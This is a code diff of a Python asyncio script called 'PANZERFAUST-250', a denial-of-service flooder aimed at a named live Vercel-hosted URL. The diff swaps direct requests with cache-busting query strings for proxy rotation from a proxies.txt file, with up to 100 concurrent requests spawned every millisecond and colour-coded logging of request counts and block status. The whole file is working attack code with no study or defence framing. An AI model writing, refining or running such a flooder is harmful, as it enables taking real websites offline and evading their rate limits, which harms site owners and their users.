@@ -2,126 +2,129 @@ import asyncio
 import aiohttp
 import sys
 import signal
-import random
 import time
 
 # ================= CONFIG =================
-TARGET = "https://sts-network.vercel.app/"
+TARGET = "https://sts-network.vercel.app/"  # CHANGE IF NEEDED
 PROXY_FILE = "proxies.txt"
-DIRECT_CONNECTIONS = 3      # REDUCED - Vercel blocks quickly
-PROXY_CONNECTIONS = 5       # REDUCED - proxies will fail fast
+MAX_CONCURRENT = 100  # Concurrent requests at once
 # ==========================================
 
 running = True
-real_requests_sent = 0
-real_responses_received = 0
-real_status_codes = []
-last_real_status = 0
+total_sent = 0
+total_responses = 0
+last_status = 0
+last_log = time.time()
+proxy_list = []
 
-# ================= LOGGING =================
-def log_status():
-    global last_real_status
-    formatted_sent = f"{real_requests_sent:,}"
-    formatted_responses = f"{real_responses_received:,}"
-    
-    # Color based on last real status
-    if last_real_status == 0:
-        status_color = '\033[91m'
-        status_text = "BLOCKED"
-    elif 200 <= last_real_status < 300:
-        status_color = '\033[92m'
-        status_text = str(last_real_status)
-    elif last_real_status == 403:
-        status_color = '\033[93m'
-        status_text = "403"
-    else:
-        status_color = '\033[91m'
-        status_text = str(last_real_status)
-    
-    print(f"\033[96mPANZERFAUST-250\033[0m:\033[92m{formatted_sent}\033[0m/\033[93m{formatted_responses}\033[0m ----> {status_color}{status_text}\033[0m")
+# ================= LOAD PROXIES =================
+def load_proxies():
+    try:
+        with open(PROXY_FILE, 'r') as f:
+            lines = [line.strip() for line in f if line.strip()]
+        return lines
+    except:
+        return []
 
-# ================= REAL ATTACK =================
-async def real_attack():
-    global real_requests_sent, real_responses_received, last_real_status, running
+# ================= SIMPLE REQUEST =================
+async def send_one(session, proxy, semaphore):
+    global total_sent, total_responses, last_status
     
-    print(f"[!] ATTACKING: {TARGET}")
-    print(f"[!] Vercel blocks at edge - expect 403/BLOCKED")
+    async with semaphore:
+        total_sent += 1
+        
+        try:
+            async with session.get(
+                TARGET,
+                proxy=proxy,
+                timeout=aiohttp.ClientTimeout(total=5)
+            ) as resp:
+                total_responses += 1
+                last_status = resp.status
+                await resp.read()
+                return resp.status
+        except aiohttp.ClientError as e:
+            last_status = 0
+            return 0
+        except:
+            last_status = 0
+            return 0
+
+# ================= MAIN LOOP =================
+async def attack_loop():
+    global proxy_list, running
     
+    # Load proxies
+    proxy_list = load_proxies()
+    if not proxy_list:
+        print("[!] No proxies in proxies.txt")
+        return
+    
+    print(f"[+] Loaded {len(proxy_list)} proxies")
+    print(f"[+] Target: {TARGET}")
+    print(f"[+] Sending...")
+    
+    # Create semaphore to limit concurrency
+    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
+    
+    # Create a session
     connector = aiohttp.TCPConnector(limit=0, force_close=True)
     
     async with aiohttp.ClientSession(connector=connector) as session:
         while running:
-            try:
-                # TRY 1: Direct attack
-                real_requests_sent += 1
-                async with session.get(
-                    TARGET + f"?attack={random.randint(1,99999)}",
-                    timeout=aiohttp.ClientTimeout(total=3)
-                ) as response:
-                    # ONLY COUNT IF WE GET A REAL RESPONSE
-                    real_responses_received += 1
-                    last_real_status = response.status
-                    real_status_codes.append(response.status)
-                    await response.read()
-                    
-                    # Show what's really happening
-                    if response.status == 403:
-                        print(f"[!] Vercel BLOCKED: 403 Forbidden")
-                    elif response.status == 429:
-                        print(f"[!] Vercel RATE LIMITED: 429 Too Many Requests")
-                    elif response.status == 200:
-                        print(f"[!] REACHED ORIGIN: 200 OK (unlikely)")
-                
-            except aiohttp.ClientConnectorError:
-                last_real_status = 0
-                print(f"[!] Connection refused (IP blocked)")
-            except aiohttp.ClientResponseError as e:
-                real_responses_received += 1
-                last_real_status = e.status
-                print(f"[!] HTTP Error: {e.status}")
-            except asyncio.TimeoutError:
-                last_real_status = 0
-                print(f"[!] Timeout (Vercel dropping packets)")
-            except Exception as e:
-                last_real_status = 0
-                print(f"[!] Error: {type(e).__name__}")
+            # Pick random proxy
+            proxy = proxy_list[total_sent % len(proxy_list)]
             
-            # Small delay to not get instantly IP banned
-            await asyncio.sleep(0.1)
+            # Send request
+            asyncio.create_task(send_one(session, proxy, semaphore))
+            
+            # Control rate (small delay)
+            await asyncio.sleep(0.001)
+
+# ================= LOGGING =================
+async def log_loop():
+    global last_log
+    
+    while running:
+        current = time.time()
+        if current - last_log >= 10:
+            last_log = current
+            
+            # Format: PANZERFAUST-250:(sent) ----> (last status)
+            sent_str = f"{total_sent:,}"
+            
+            status_color = '\033[91m'  # red
+            if last_status == 200:
+                status_color = '\033[92m'  # green
+            elif 200 <= last_status < 300:
+                status_color = '\033[92m'
+            elif 300 <= last_status < 400:
+                status_color = '\033[93m'  # yellow
+            
+            status_text = str(last_status) if last_status != 0 else "BLOCKED"
+            
+            print(f"\033[96mPANZERFAUST-250\033[0m:\033[92m{sent_str}\033[0m ----> {status_color}{status_text}\033[0m")
+        
+        await asyncio.sleep(1)
 
 # ================= MAIN =================
 async def main():
-    global running
+    # Start both loops
+    attack_task = asyncio.create_task(attack_loop())
+    log_task = asyncio.create_task(log_loop())
     
-    print(f"\033[91m[!] PANZERFAUST-250 VERCELL TRUTH TEST\033[0m")
-    print(f"\033[93m[TARGET] {TARGET}\033[0m")
-    print(f"\033[91m[WARNING] Vercel blocks all DDoS at edge\033[0m")
-    print(f"\033[91m[WARNING] You will see 403/429/BLOCKED\033[0m")
-    print("-" * 50)
+    # Wait for either to finish
+    await asyncio.wait([attack_task, log_task], 
+                      return_when=asyncio.FIRST_COMPLETED)
     
-    # Start attack
-    attack_task = asyncio.create_task(real_attack())
-    
-    # Start logging every 10 seconds
-    while running:
-        log_status()
-        
-        # Show recent status codes
-        if real_status_codes:
-            recent = real_status_codes[-10:] if len(real_status_codes) > 10 else real_status_codes
-            print(f"Recent statuses: {recent}")
-        
-        try:
-            await asyncio.sleep(10)
-        except asyncio.CancelledError:
-            break
-    
-    await attack_task
+    # Cancel remaining
+    attack_task.cancel()
+    log_task.cancel()
 
 def signal_handler(sig, frame):
     global running
-    print(f"\n\033[91m[!] Stopping...\033[0m")
     running = False
+    print(f"\n[!] Stopping...")
 
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, signal_handler)
@@ -129,12 +132,9 @@ if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n\033[91m[!] Stopped by user\033[0m")
+        pass
     finally:
-        print(f"\n\033[95m[RESULTS]\033[0m")
-        print(f"Requests attempted: {real_requests_sent:,}")
-        print(f"Responses received: {real_responses_received:,}")
-        print(f"Success rate: {(real_responses_received/real_requests_sent*100 if real_requests_sent > 0 else 0):.1f}%")
-        if real_status_codes:
-            from collections import Counter
-            print(f"Status codes: {Counter(real_status_codes)}")
+        print(f"\n[+] Total sent: {total_sent:,}")
+        print(f"[+] Responses: {total_responses:,}")
+        if total_sent > 0:
+            print(f"[+] Success rate: {(total_responses/total_sent*100):.1f}%")
